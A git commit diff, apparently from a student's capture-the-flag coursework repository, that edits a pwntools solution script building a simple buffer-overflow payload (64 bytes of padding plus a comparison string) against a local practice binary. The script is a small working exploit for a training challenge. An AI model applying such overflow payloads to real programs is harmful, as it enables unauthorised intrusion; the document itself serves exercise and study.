70f8e1d5cf2358a8614f5c63dcb0bc03acb51bf5
Astrubale023 <105603853+Astrubale023@users.noreply.github.com>
2024-12-20 12:17:04 +0100

    super commit finale segreto assurdo pazzesco nazionale

--- Secondo Compitino/Nicola/Challenges15/2_enc_pwn0/solution.py
+++ Secondo Compitino/Nicola/Challenges15/2_enc_pwn0/solution.py
@@ -1,7 +1,7 @@
 from pwn import *
 
 garbage = b'A'*64	#64 bytes of garbage for the buffer
-josh = b"H!igh"	# the string to compare
+josh = b"H!gh"	# the string to compare
 payload = garbage + josh
 
 p = process("./pwn0")
